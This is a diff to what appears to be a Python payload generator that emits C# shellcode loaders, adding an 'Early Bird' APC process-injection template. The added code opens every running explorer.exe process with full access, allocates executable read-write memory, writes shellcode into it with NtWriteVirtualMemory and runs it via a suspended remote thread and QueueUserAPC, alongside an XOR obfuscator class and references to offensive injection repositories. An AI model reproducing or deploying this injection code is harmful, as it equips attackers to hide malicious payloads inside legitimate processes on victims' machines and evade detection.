@@ -1,7 +1,9 @@
 import base64
 import subprocess
 
-# References: https://github.com/plackyhacker/Shellcode-Injection-Techniques
+# References:
+# https://github.com/plackyhacker/Shellcode-Injection-Techniques
+# https://github.com/Kara-4search/EarlyBirdInjection_CSharp
 
 DLL_IMPORT = {
   "VirtualAlloc": "",
@@ -344,47 +346,171 @@ START_PROCESS_INTERPROCESS_CODE = """
          }
 """
 
-### OTHER IMPORTS
-## The low-level native APIs NtCreateSection, NtMapViewOfSection, NtUnMapViewOfSection, and NtClose in ntdll.dll can be used as alternatives to VirtualAllocEx and WriteProcessMemory.
 
-#        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-#        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-#
-#        [DllImport("kernel32.dll")]
-#        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-#
-#        [DllImport("kernel32.dll")]
-#        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+START_PROCESS_EARLYBIRD_IMPORT = """
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        public static extern IntPtr VirtualAllocEx(
+            IntPtr hProcess, 
+            IntPtr lpAddress,
+            uint dwSize,
+            AllocationType flAllocationType,
+            AllocationProtect flProtect);
 
-#        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
-#        static extern UInt32 NtCreateSection(
-#            ref IntPtr SectionHandle,
-#            UInt32 DesiredAccess,
-#            IntPtr ObjectAttributes,
-#            ref UInt32 MaximumSize,
-#            UInt32 SectionPageProtection,
-#            UInt32 AllocationAttributes,
-#            IntPtr FileHandle);
-#
-#        [DllImport("ntdll.dll", SetLastError=true)]
-#        static extern uint NtMapViewOfSection(
-#            IntPtr SectionHandle,
-#            IntPtr ProcessHandle,
-#            ref IntPtr BaseAddress,
-#            UIntPtr ZeroBits,
-#            UIntPtr CommitSize,
-#            out ulong SectionOffset,
-#            out uint ViewSize,
-#            uint InheritDisposition,
-#            uint AllocationType,
-#            uint Win32Protect);
-#
-#        [DllImport("ntdll.dll", SetLastError=true)]
-#        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
-#
-#        [DllImport("ntdll.dll", ExactSpelling=true, SetLastError=false)]
-#        static extern int NtClose(IntPtr hObject);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr OpenProcess(
+            uint processAccess,
+            bool bInheritHandle,
+            int processId);
 
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr CreateRemoteThread(
+            IntPtr hProcess,
+            IntPtr lpThreadAttributes,
+            uint dwStackSize,
+            IntPtr lpStartAddress,
+            IntPtr lpParameter,
+            uint dwCreationFlags,
+            out IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern UInt32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, UInt32 dwData);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool CloseHandle(IntPtr hObject);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern uint ResumeThread(IntPtr hThread);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        public static extern NTSTATUS NtWriteVirtualMemory(
+            IntPtr ProcessHandle,
+            IntPtr BaseAddress,
+            byte[] buffer,
+            UInt32 nSize,
+            ref UInt32 lpNumberOfBytesWritten
+        );
+
+        [DllImport("kernel32.dll")]
+        public static extern void RtlZeroMemory(IntPtr pBuffer, int length);
+
+        [DllImport("kernel32")]
+        public static extern UInt32 WaitForSingleObject(
+            IntPtr hHandle,
+            UInt32 dwMilliseconds
+        );
+
+                [Flags]
+        public enum NTSTATUS : uint
+        {
+            Success = 0,
+            Informational = 0x40000000,
+            Error = 0xc0000000
+        }
+
+
+        [Flags]
+        public enum AllocationType
+        {
+            Commit = 0x1000,
+            Reserve = 0x2000,
+            Decommit = 0x4000,
+            Release = 0x8000,
+            Reset = 0x80000,
+            Physical = 0x400000,
+            TopDown = 0x100000,
+            WriteWatch = 0x200000,
+            LargePages = 0x20000000
+        }
+
+        [Flags]
+        public enum AllocationProtect : uint
+        {
+            PAGE_EXECUTE = 0x00000010,
+            PAGE_EXECUTE_READ = 0x00000020,
+            PAGE_EXECUTE_READWRITE = 0x00000040,
+            PAGE_EXECUTE_WRITECOPY = 0x00000080,
+            PAGE_NOACCESS = 0x00000001,
+            PAGE_READONLY = 0x00000002,
+            PAGE_READWRITE = 0x00000004,
+            PAGE_WRITECOPY = 0x00000008,
+            PAGE_GUARD = 0x00000100,
+            PAGE_NOCACHE = 0x00000200,
+            PAGE_WRITECOMBINE = 0x00000400
+        }
+
+        [Flags]
+        public enum ProcessAccessFlags : uint
+        {
+            All = 0x001F0FFF,
+            Terminate = 0x00000001,
+            CreateThread = 0x00000002,
+            VirtualMemoryOperation = 0x00000008,
+            VirtualMemoryRead = 0x00000010,
+            VirtualMemoryWrite = 0x00000020,
+            DuplicateHandle = 0x00000040,
+            CreateProcess = 0x000000080,
+            SetQuota = 0x00000100,
+            SetInformation = 0x00000200,
+            QueryInformation = 0x00000400,
+            QueryLimitedInformation = 0x00001000,
+            Synchronize = 0x00100000
+        }
+
+        [Flags]
+        public enum CreationFlags : uint
+        {
+            RunImmediately = 0,
+            CREATE_SUSPENDED = 0x00000004,
+            STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000
+        }
+"""
+
+START_PROCESS_EARLYBIRD_CODE = """
+          //ProcessStartInfo start = new ProcessStartInfo();
+          //start.Arguments = ""; 
+          //start.FileName = "notepad.exe";
+          //start.WindowStyle = ProcessWindowStyle.Hidden;
+          //start.CreateNoWindow = true;
+          //int exitCode;
+          //// Run the external process & wait for it to finish
+          //using (Process proc = Process.Start(start))
+          //{
+            Process[] expProc = Process.GetProcessesByName("explorer");
+            for (int i = 0; i < expProc.Length; i++) {
+            
+            IntPtr Process_handle = OpenProcess((uint)ProcessAccessFlags.All, false, expProc[i].Id);
+            IntPtr VAlloc_address = VirtualAllocEx(
+                Process_handle, 
+                IntPtr.Zero, 
+                (uint)shellcode.Length, 
+                AllocationType.Commit, 
+                AllocationProtect.PAGE_EXECUTE_READWRITE);
+
+            
+            IntPtr shellcode_address = Marshal.AllocHGlobal(shellcode.Length);
+            RtlZeroMemory(shellcode_address, shellcode.Length);
+
+            UInt32 getsize = 0;
+            NTSTATUS ntstatus = NtWriteVirtualMemory(Process_handle, VAlloc_address, shellcode, (uint)shellcode.Length, ref getsize);
+
+            IntPtr Thread_id = IntPtr.Zero;
+            IntPtr Thread_handle = CreateRemoteThread(
+                Process_handle, 
+                IntPtr.Zero, 
+                0, 
+                (IntPtr)0xfff,
+                IntPtr.Zero, 
+                (uint)CreationFlags.CREATE_SUSPENDED, 
+                out Thread_id);
+
+            QueueUserAPC(VAlloc_address, Thread_handle, 0);
+            ResumeThread(Thread_handle);
+            CloseHandle(Process_handle);
+            CloseHandle(Thread_handle);
+            }
+            //}
+"""
 
 class Obfuscator:
   def __init__(self, string, xor_key=b'\00'):
